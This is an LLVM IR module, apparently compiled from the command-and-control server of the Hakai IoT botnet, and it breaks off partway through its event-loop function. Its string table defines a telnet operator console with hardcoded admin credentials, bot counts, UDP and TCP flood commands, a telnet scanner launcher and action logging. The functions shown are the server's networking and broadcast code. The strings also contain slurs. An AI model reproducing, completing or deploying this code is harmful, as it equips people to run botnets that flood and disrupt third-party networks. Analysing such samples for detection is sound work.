; ModuleID = 'host/ir_O0/Hakai.a.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.clientdata_t = type { i32, [7 x i8], [512 x i8], i8 }
%struct.telnetdata_t = type { i32, i32, [20 x i8] }
%struct.name = type { [512 x i8], i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.account = type { [200 x i8], [200 x i8], [200 x i8] }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@clients = common global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = common global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"\1B[1;31m\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.3 = private unnamed_addr constant [45 x i8] c"\0D\0A\1B[1;31m%s\1B[1;36m@\1B[1;31mhbot\1B[1;36m#: \1B[0m\00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.5 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"name:\00", align 1
@arra = internal global [40 x %struct.name] zeroinitializer, align 16
@.str.7 = private unnamed_addr constant [9 x i8] c".DSLKFJ\0A\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.9 = private unnamed_addr constant [8 x i8] c"LOCKED \00", align 1
@fileFD = internal global %struct._IO_FILE* null, align 8
@.str.10 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.11 = private unnamed_addr constant [11 x i8] c"killed pid\00", align 1
@BOATSRAPED = internal global i32 0, align 4
@.str.12 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.13 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.14 = private unnamed_addr constant [6 x i8] c"\22%s\22\0A\00", align 1
@.str.108 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@.str.15 = private unnamed_addr constant [10 x i8] c"login.txt\00", align 1
@.str.16 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.17 = private unnamed_addr constant [15 x i8] c"[%d.%d.%d.%d]\0A\00", align 1
@.str.18 = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@titleWriter.spinbuf = private unnamed_addr constant [4 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.22, i32 0, i32 0)], align 16
@.str.23 = private unnamed_addr constant [35 x i8] c"%c]0;%d Devices Connected %s  %s%c\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.20 = private unnamed_addr constant [2 x i8] c"\5C\00", align 1
@.str.21 = private unnamed_addr constant [2 x i8] c"|\00", align 1
@.str.22 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@managesConnected = internal global i32 0, align 4
@.str.24 = private unnamed_addr constant [6 x i8] c"admin\00", align 1
@.str.25 = private unnamed_addr constant [7 x i8] c"shadoh\00", align 1
@.str.26 = private unnamed_addr constant [6 x i8] c"!HBOT\00", align 1
@accounts = internal global [25 x %struct.account] zeroinitializer, align 16
@.str.27 = private unnamed_addr constant [9 x i8] c"%s %s %s\00", align 1
@.str.28 = private unnamed_addr constant [30 x i8] c"\1B[1;31mUsername\1B[1;36m:\1B[37m \00", align 1
@.str.30 = private unnamed_addr constant [15 x i8] c"connection.log\00", align 1
@.str.31 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.32 = private unnamed_addr constant [26 x i8] c"[LOGIN ATTEMPT] USER: %s\0A\00", align 1
@.str.33 = private unnamed_addr constant [30 x i8] c"\1B[1;31mPassword\1B[1;36m:\1B[37m \00", align 1
@.str.34 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.35 = private unnamed_addr constant [27 x i8] c"[FAILED ATTEMPT] USER: %s\0A\00", align 1
@.str.36 = private unnamed_addr constant [15 x i8] c"\1B[1A\1B[2J\1B[1;1H\00", align 1
@.str.37 = private unnamed_addr constant [43 x i8] c"\1B[1;31m%s\1B[1;36m@\1B[1;31mhbot\1B[1;36m#: \1B[0m\00", align 1
@.str.29 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.38 = private unnamed_addr constant [5 x i8] c"bots\00", align 1
@.str.39 = private unnamed_addr constant [6 x i8] c"count\00", align 1
@.str.40 = private unnamed_addr constant [9 x i8] c"botcount\00", align 1
@.str.41 = private unnamed_addr constant [30 x i8] c"\1B[37;1m%s\1B[31;1m: \1B[37;1m%d\0D\0A\00", align 1
@.str.42 = private unnamed_addr constant [33 x i8] c"\1B[37;1mtotal\1B[31;1m: \1B[37;1m%d\0D\0A\00", align 1
@.str.43 = private unnamed_addr constant [6 x i8] c"rape?\00", align 1
@.str.44 = private unnamed_addr constant [34 x i8] c"\1B[0mhbot.botkill: \1B[1;31m%d\1B[0m\0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [8 x i8] c"resolve\00", align 1
@.str.46 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.47 = private unnamed_addr constant [28 x i8] c"\1B[0mresolved [%s] to [%s]\0D\0A\00", align 1
@.str.48 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@.str.49 = private unnamed_addr constant [37 x i8] c"\1B[0mddoscmds - shows ddos commands\0D\0A\00", align 1
@.str.50 = private unnamed_addr constant [36 x i8] c"servercmds - server side commands\0D\0A\00", align 1
@.str.51 = private unnamed_addr constant [29 x i8] c"admincmds - admin commands\0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [11 x i8] c"servercmds\00", align 1
@.str.53 = private unnamed_addr constant [29 x i8] c"\1B[0mbots - shows bot count\0D\0A\00", align 1
@.str.54 = private unnamed_addr constant [29 x i8] c"exit - disconnect from net\0D\0A\00", align 1
@.str.55 = private unnamed_addr constant [28 x i8] c"help - displays help menu\0D\0A\00", align 1
@.str.56 = private unnamed_addr constant [10 x i8] c"admincmds\00", align 1
@.str.57 = private unnamed_addr constant [51 x i8] c"\1B[0mbtype - shows architecture of bots connected\0D\0A\00", align 1
@.str.58 = private unnamed_addr constant [46 x i8] c"users - displays who's connected to the net\0D\0A\00", align 1
@.str.59 = private unnamed_addr constant [66 x i8] c"addusr - add users via server side (IN DEVELOPMENT! VERY BUGGY)\0D\0A\00", align 1
@.str.60 = private unnamed_addr constant [32 x i8] c"start - starts telnet scanner\0D\0A\00", align 1
@.str.61 = private unnamed_addr constant [39 x i8] c"kickuser - logs user out must be admin\00", align 1
@.str.62 = private unnamed_addr constant [41 x i8] c"You Must Be Admin to Use This Command!\0D\0A\00", align 1
@.str.63 = private unnamed_addr constant [9 x i8] c"ddoscmds\00", align 1
@.str.64 = private unnamed_addr constant [28 x i8] c"\1B[0mUDP ip port time size\0D\0A\00", align 1
@.str.65 = private unnamed_addr constant [24 x i8] c"TCP ip port time size\0D\0A\00", align 1
@.str.66 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.67 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.68 = private unnamed_addr constant [5 x i8] c"\1B[0m\00", align 1
@.str.69 = private unnamed_addr constant [16 x i8] c"Attack Sent! \0D\0A\00", align 1
@.str.70 = private unnamed_addr constant [12 x i8] c"actions.log\00", align 1
@.str.71 = private unnamed_addr constant [31 x i8] c"[hbot] [%s] [Sent an Attack!]\0A\00", align 1
@.str.72 = private unnamed_addr constant [5 x i8] c". KT\00", align 1
@.str.73 = private unnamed_addr constant [32 x i8] c"[hbot] [%s] [Killed All Pid's]\0A\00", align 1
@.str.74 = private unnamed_addr constant [4 x i8] c"cls\00", align 1
@.str.75 = private unnamed_addr constant [6 x i8] c"users\00", align 1
@.str.76 = private unnamed_addr constant [39 x i8] c"\1B[31m- \1B[31mOnline Users \1B[31m-\1B[37m\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [37 x i8] c"\1B[37mID(\1B[31m%d\1B[37m) \1B[31m%s\1B[37m\0D\0A\00", align 1
@.str.78 = private unnamed_addr constant [9 x i8] c"kickuser\00", align 1
@.str.79 = private unnamed_addr constant [6 x i8] c"user=\00", align 1
@.str.80 = private unnamed_addr constant [6 x i8] c"USER=\00", align 1
@.str.81 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@.str.82 = private unnamed_addr constant [43 x i8] c"\0A\1B[31mGoodbye, kicked by \1B[34m%s\1B[37m...\0D\0A\00", align 1
@.str.83 = private unnamed_addr constant [30 x i8] c"\1B[33mKicked \1B[34m%s\1B[37m...\0D\0A\00", align 1
@.str.84 = private unnamed_addr constant [4 x i8] c"id=\00", align 1
@.str.85 = private unnamed_addr constant [4 x i8] c"ID=\00", align 1
@.str.86 = private unnamed_addr constant [46 x i8] c"\1B[33mKicked user with id of \1B[34m%d\1B[37m...\0D\0A\00", align 1
@.str.87 = private unnamed_addr constant [53 x i8] c"You Must Be big daddy shadoh to kick others, queer\0D\0A\00", align 1
@.str.88 = private unnamed_addr constant [8 x i8] c"adduser\00", align 1
@.str.89 = private unnamed_addr constant [24 x i8] c"echo '\0A%s' >> login.txt\00", align 1
@.str.90 = private unnamed_addr constant [33 x i8] c"[hbot] [%s] [added a user] [%s]\0A\00", align 1
@.str.91 = private unnamed_addr constant [5 x i8] c"exit\00", align 1
@.str.92 = private unnamed_addr constant [10 x i8] c"%s: \22%s\22\0A\00", align 1
@.str.93 = private unnamed_addr constant [9 x i8] c"chat.log\00", align 1
@.str.94 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.95 = private unnamed_addr constant [17 x i8] c"ERROR on binding\00", align 1
@.str.96 = private unnamed_addr constant [26 x i8] c"[hbot] [Admin Connected] \00", align 1
@.str.97 = private unnamed_addr constant [39 x i8] c"[hbot] [Admin Connected] [%d.%d.%d.%d]\00", align 1
@.str.98 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.99 = private unnamed_addr constant [46 x i8] c"[hbot] Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.100 = private unnamed_addr constant [11 x i8] c"telnet.txt\00", align 1
@.str.101 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.102 = private unnamed_addr constant [11 x i8] c"killer.txt\00", align 1
@kfileFD = internal global %struct._IO_FILE* null, align 8
@.str.103 = private unnamed_addr constant [31 x i8] c"[hbot] Lower Threading Count.\0A\00", align 1
@.str.104 = private unnamed_addr constant [33 x i8] c"[hbot] Socket Opened On Port %d\0A\00", align 1
@.str.105 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.106 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.107 = private unnamed_addr constant [5 x i8] c"hbot\00", align 1
@.str.109 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.110 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.111 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1

; Function Attrs: noinline nounwind uwtable
define i32 @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %27, %3
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %7, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

; <label>:16:                                     ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %7, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

; <label>:25:                                     ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

; <label>:27:                                     ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %8, align 4
  %35 = load i32, i32* %7, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %7, align 4
  br label %9

; <label>:37:                                     ; preds = %25
  %38 = load i32, i32* %8, align 4
  ret i32 %38
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #8
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %25, %1
  %11 = call i16** @__ctype_b_loc() #9
  %12 = load i16*, i16** %11, align 8
  %13 = load i8*, i8** %2, align 8
  %14 = load i32, i32* %4, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i8, i8* %13, i64 %15
  %17 = load i8, i8* %16, align 1
  %18 = sext i8 %17 to i32
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i16, i16* %12, i64 %19
  %21 = load i16, i16* %20, align 2
  %22 = zext i16 %21 to i32
  %23 = and i32 %22, 8192
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %28

; <label>:25:                                     ; preds = %10
  %26 = load i32, i32* %4, align 4
  %27 = add nsw i32 %26, 1
  store i32 %27, i32* %4, align 4
  br label %10

; <label>:28:                                     ; preds = %10
  br label %29

; <label>:29:                                     ; preds = %50, %28
  %30 = load i32, i32* %5, align 4
  %31 = load i32, i32* %4, align 4
  %32 = icmp sge i32 %30, %31
  br i1 %32, label %33, label %48

; <label>:33:                                     ; preds = %29
  %34 = call i16** @__ctype_b_loc() #9
  %35 = load i16*, i16** %34, align 8
  %36 = load i8*, i8** %2, align 8
  %37 = load i32, i32* %5, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds i8, i8* %36, i64 %38
  %40 = load i8, i8* %39, align 1
  %41 = sext i8 %40 to i32
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds i16, i16* %35, i64 %42
  %44 = load i16, i16* %43, align 2
  %45 = zext i16 %44 to i32
  %46 = and i32 %45, 8192
  %47 = icmp ne i32 %46, 0
  br label %48

; <label>:48:                                     ; preds = %33, %29
  %49 = phi i1 [ false, %29 ], [ %47, %33 ]
  br i1 %49, label %50, label %53

; <label>:50:                                     ; preds = %48
  %51 = load i32, i32* %5, align 4
  %52 = add nsw i32 %51, -1
  store i32 %52, i32* %5, align 4
  br label %29

; <label>:53:                                     ; preds = %48
  %54 = load i32, i32* %4, align 4
  store i32 %54, i32* %3, align 4
  br label %55

; <label>:55:                                     ; preds = %71, %53
  %56 = load i32, i32* %3, align 4
  %57 = load i32, i32* %5, align 4
  %58 = icmp sle i32 %56, %57
  br i1 %58, label %59, label %74

; <label>:59:                                     ; preds = %55
  %60 = load i8*, i8** %2, align 8
  %61 = load i32, i32* %3, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds i8, i8* %60, i64 %62
  %64 = load i8, i8* %63, align 1
  %65 = load i8*, i8** %2, align 8
  %66 = load i32, i32* %3, align 4
  %67 = load i32, i32* %4, align 4
  %68 = sub nsw i32 %66, %67
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8, i8* %65, i64 %69
  store i8 %64, i8* %70, align 1
  br label %71

; <label>:71:                                     ; preds = %59
  %72 = load i32, i32* %3, align 4
  %73 = add nsw i32 %72, 1
  store i32 %73, i32* %3, align 4
  br label %55

; <label>:74:                                     ; preds = %55
  %75 = load i8*, i8** %2, align 8
  %76 = load i32, i32* %3, align 4
  %77 = load i32, i32* %4, align 4
  %78 = sub nsw i32 %76, %77
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds i8, i8* %75, i64 %79
  store i8 0, i8* %80, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind readnone
declare i16** @__ctype_b_loc() #3

; Function Attrs: noinline nounwind uwtable
define void @broadcast(i8*, i32, i8*) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca [56 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i64, align 8
  %11 = alloca %struct.tm*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i8* %2, i8** %6, align 8
  store i32 1, i32* %7, align 4
  %14 = load i8*, i8** %4, align 8
  %15 = call i32 @strcmp(i8* %14, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0)) #8
  %16 = icmp eq i32 %15, 0
  br i1 %16, label %17, label %18

; <label>:17:                                     ; preds = %3
  store i32 0, i32* %7, align 4
  br label %18

; <label>:18:                                     ; preds = %17, %3
  %19 = load i8*, i8** %4, align 8
  %20 = call i64 @strlen(i8* %19) #8
  %21 = add i64 %20, 10
  %22 = call noalias i8* @malloc(i64 %21) #7
  store i8* %22, i8** %9, align 8
  %23 = load i8*, i8** %9, align 8
  %24 = load i8*, i8** %4, align 8
  %25 = call i64 @strlen(i8* %24) #8
  %26 = add i64 %25, 10
  call void @llvm.memset.p0i8.i64(i8* %23, i8 0, i64 %26, i32 1, i1 false)
  %27 = load i8*, i8** %9, align 8
  %28 = load i8*, i8** %4, align 8
  %29 = call i8* @strcpy(i8* %27, i8* %28) #7
  %30 = load i8*, i8** %9, align 8
  call void @trim(i8* %30)
  %31 = call i64 @time(i64* %10) #7
  %32 = call %struct.tm* @localtime(i64* %10) #7
  store %struct.tm* %32, %struct.tm** %11, align 8
  %33 = load %struct.tm*, %struct.tm** %11, align 8
  %34 = call i8* @asctime(%struct.tm* %33) #7
  store i8* %34, i8** %12, align 8
  %35 = load i8*, i8** %12, align 8
  call void @trim(i8* %35)
  store i32 0, i32* %13, align 4
  br label %36

; <label>:36:                                     ; preds = %113, %18
  %37 = load i32, i32* %13, align 4
  %38 = icmp slt i32 %37, 1000000
  br i1 %38, label %39, label %116

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %13, align 4
  %41 = load i32, i32* %5, align 4
  %42 = icmp eq i32 %40, %41
  br i1 %42, label %60, label %43

; <label>:43:                                     ; preds = %39
  %44 = load i32, i32* %13, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %45
  %47 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %46, i32 0, i32 3
  %48 = load i8, i8* %47, align 1
  %49 = icmp ne i8 %48, 0
  br i1 %49, label %61, label %50

; <label>:50:                                     ; preds = %43
  %51 = load i32, i32* %7, align 4
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %60, label %53

; <label>:53:                                     ; preds = %50
  %54 = load i32, i32* %13, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %55
  %57 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %56, i32 0, i32 1
  %58 = load i32, i32* %57, align 4
  %59 = icmp ne i32 %58, 0
  br i1 %59, label %61, label %60

; <label>:60:                                     ; preds = %53, %50, %39
  br label %113

; <label>:61:                                     ; preds = %53, %43
  %62 = load i32, i32* %7, align 4
  %63 = icmp ne i32 %62, 0
  br i1 %63, label %64, label %81

; <label>:64:                                     ; preds = %61
  %65 = load i32, i32* %13, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %66
  %68 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %67, i32 0, i32 1
  %69 = load i32, i32* %68, align 4
  %70 = icmp ne i32 %69, 0
  br i1 %70, label %71, label %81

; <label>:71:                                     ; preds = %64
  %72 = load i32, i32* %13, align 4
  %73 = call i64 @send(i32 %72, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i32 0, i32 0), i64 7, i32 16384)
  %74 = load i32, i32* %13, align 4
  %75 = load i8*, i8** %6, align 8
  %76 = load i8*, i8** %6, align 8
  %77 = call i64 @strlen(i8* %76) #8
  %78 = call i64 @send(i32 %74, i8* %75, i64 %77, i32 16384)
  %79 = load i32, i32* %13, align 4
  %80 = call i64 @send(i32 %79, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i32 0, i32 0), i64 2, i32 16384)
  br label %81

; <label>:81:                                     ; preds = %71, %64, %61
  %82 = load i32, i32* %13, align 4
  %83 = load i8*, i8** %4, align 8
  %84 = load i8*, i8** %4, align 8
  %85 = call i64 @strlen(i8* %84) #8
  %86 = call i64 @send(i32 %82, i8* %83, i64 %85, i32 16384)
  %87 = getelementptr inbounds [56 x i8], [56 x i8]* %8, i32 0, i32 0
  %88 = load i32, i32* %13, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %89
  %91 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %90, i32 0, i32 2
  %92 = getelementptr inbounds [20 x i8], [20 x i8]* %91, i32 0, i32 0
  %93 = call i32 (i8*, i8*, ...) @sprintf(i8* %87, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.3, i32 0, i32 0), i8* %92) #7
  %94 = load i32, i32* %7, align 4
  %95 = icmp ne i32 %94, 0
  br i1 %95, label %96, label %109

; <label>:96:                                     ; preds = %81
  %97 = load i32, i32* %13, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %98
  %100 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %99, i32 0, i32 1
  %101 = load i32, i32* %100, align 4
  %102 = icmp ne i32 %101, 0
  br i1 %102, label %103, label %109

; <label>:103:                                    ; preds = %96
  %104 = load i32, i32* %13, align 4
  %105 = getelementptr inbounds [56 x i8], [56 x i8]* %8, i32 0, i32 0
  %106 = getelementptr inbounds [56 x i8], [56 x i8]* %8, i32 0, i32 0
  %107 = call i64 @strlen(i8* %106) #8
  %108 = call i64 @send(i32 %104, i8* %105, i64 %107, i32 16384)
  br label %112

; <label>:109:                                    ; preds = %96, %81
  %110 = load i32, i32* %13, align 4
  %111 = call i64 @send(i32 %110, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i32 0, i32 0), i64 1, i32 16384)
  br label %112

; <label>:112:                                    ; preds = %109, %103
  br label %113

; <label>:113:                                    ; preds = %112, %60
  %114 = load i32, i32* %13, align 4
  %115 = add nsw i32 %114, 1
  store i32 %115, i32* %13, align 4
  br label %36

; <label>:116:                                    ; preds = %36
  %117 = load i8*, i8** %9, align 8
  call void @free(i8* %117) #7
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #2

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: nounwind
declare i64 @time(i64*) #4

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) #4

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) #4

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #4

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @removestr(i8*, i8*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %5 = load i8*, i8** %3, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = call i8* @strstr(i8* %5, i8* %6) #8
  store i8* %7, i8** %3, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = load i8*, i8** %3, align 8
  %10 = load i8*, i8** %4, align 8
  %11 = call i64 @strlen(i8* %10) #8
  %12 = getelementptr inbounds i8, i8* %9, i64 %11
  %13 = load i8*, i8** %3, align 8
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #8
  %16 = getelementptr inbounds i8, i8* %13, i64 %15
  %17 = call i64 @strlen(i8* %16) #8
  %18 = add i64 1, %17
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %8, i8* %12, i64 %18, i32 1, i1 false)
  ret void
}

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #2

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define i8* @epollEventLoop(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca %struct.epoll_event, align 1
  %5 = alloca %struct.epoll_event*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr, align 2
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [200 x i8], align 16
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.clientdata_t*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i64, align 8
  %20 = alloca [2048 x i8], align 16
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %23 = call noalias i8* @calloc(i64 1000000, i64 12) #7
  %24 = bitcast i8* %23 to %struct.epoll_event*
  store %struct.epoll_event* %24, %struct.epoll_event** %5, align 8
  br label %25

; <label>:25:                                     ; preds = %344, %1
  %26 = load volatile i32, i32* @epollFD, align 4
  %27 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %28 = call i32 @epoll_wait(i32 %26, %struct.epoll_event* %27, i32 1000000, i32 -1)
  store i32 %28, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %29

; <label>:29:                                     ; preds = %341, %25
  %30 = load i32, i32* %8, align 4
  %31 = load i32, i32* %7, align 4
  %32 = icmp slt i32 %30, %31
  br i1 %32, label %33, label %344

; <label>:33:                                     ; preds = %29
  %34 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %35 = load i32, i32* %8, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %34, i64 %36
  %38 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %37, i32 0, i32 0
  %39 = load i32, i32* %38, align 1
  %40 = and i32 %39, 8
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %60, label %42

; <label>:42:                                     ; preds = %33
  %43 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %44 = load i32, i32* %8, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %43, i64 %45
  %47 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %46, i32 0, i32 0
  %48 = load i32, i32* %47, align 1
  %49 = and i32 %48, 16
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %60, label %51

; <label>:51:                                     ; preds = %42
  %52 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = sext i32 %53 to i64
